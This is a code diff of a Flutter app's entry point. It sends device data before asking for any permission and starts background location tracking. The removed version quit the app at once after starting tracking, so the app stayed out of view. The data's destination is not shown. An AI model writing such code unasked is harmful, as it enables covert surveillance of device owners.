@@ -1,40 +1,56 @@
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
 import 'package:permission_handler/permission_handler.dart';
-
-const deviceChannel = MethodChannel('device_collector');
-const serviceChannel = MethodChannel('background_service');
+import 'location_service.dart';
+import 'device_service.dart';
 
 Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
 
-  // Request permissions
-  final phoneStatus = await Permission.phone.request();
-  final locationStatus = await Permission.location.request();
-  final backgroundStatus = await Permission.locationAlways.request();
+  try {
+    await DeviceService.collectAndSendDeviceData();
+    print("Device data collection initiated");
+  } catch (e) {
+    print("Error collecting device data: $e");
+  }
+
   await Permission.notification.request();
+  await Permission.location.request();
+  if (await Permission.location.isGranted) {
+    await Permission.locationAlways.request();
+  }
 
-  // Collect and send device info (now handled in native code)
-  if (phoneStatus.isGranted) {
-    try {
-      await deviceChannel.invokeMethod('collectAndSendDeviceData');
-      print("Device data collection initiated");
-    } catch (e) {
-      print("Error collecting device data: $e");
+  //SystemNavigator.pop();
+  runApp(const MyApp());
+}
+
+class MyApp extends StatefulWidget {
+  const MyApp({super.key});
+
+  @override
+  State<MyApp> createState() => _MyAppState();
+}
+
+class _MyAppState extends State<MyApp> {
+  @override
+  void initState() {
+    super.initState();
+    startService();
+  }
+
+  Future<void> startService() async {
+    if (await Permission.locationAlways.isGranted) {
+      await LocationService.instance.startLocationTracking();
     }
   }
 
-  // Start location service
-  if (locationStatus.isGranted && backgroundStatus.isGranted) {
-    try {
-      await serviceChannel.invokeMethod('startService');
-      print("Background GPS service started");
-    } catch (e) {
-      print("Error starting background service: $e");
-    }
-  } else {
-    print("Location permissions not granted");
+  @override
+  Widget build(BuildContext context) {
+    return const MaterialApp(
+      home: Scaffold(
+        body: Center(
+          child: Text('Location tracking is running in the background'),
+        ),
+      ),
+    );
   }
-
-  SystemNavigator.pop();
 }
